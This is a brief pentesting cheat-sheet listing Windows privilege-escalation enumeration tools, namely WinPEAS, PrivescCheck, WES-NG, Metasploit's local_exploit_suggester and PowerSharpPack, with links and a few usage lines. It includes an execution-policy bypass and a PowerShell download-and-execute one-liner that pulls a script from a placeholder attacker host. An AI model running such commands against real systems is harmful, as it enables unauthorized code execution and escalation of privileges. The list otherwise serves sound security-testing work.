### 1: WinPEAS  Author:https://github.com/carlospolop/PEASS-ng/releases

### 2: Privesccheck (Set -ExecutionPolicy Bypass -Scope process -Force) Author: https://github.com/itm4n/PrivescCheck

### 3: Windows Exploit Suggester - Next Generation (WES-NG) Author: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Systeminfo > txt file

### wes.py --update

### 4: Metasploit (multi/recon/local_exploit_suggester)

### 5: PowerSharpPack https://github.com/S3cur3Th1sSh1t/PowerSharpPack

    iex(new-object net.webclient).downloadstring('http://ATTACK_IP:PORT/PowerSharpPack.ps1')

### Then

    PowerSharpPack -winPEAS
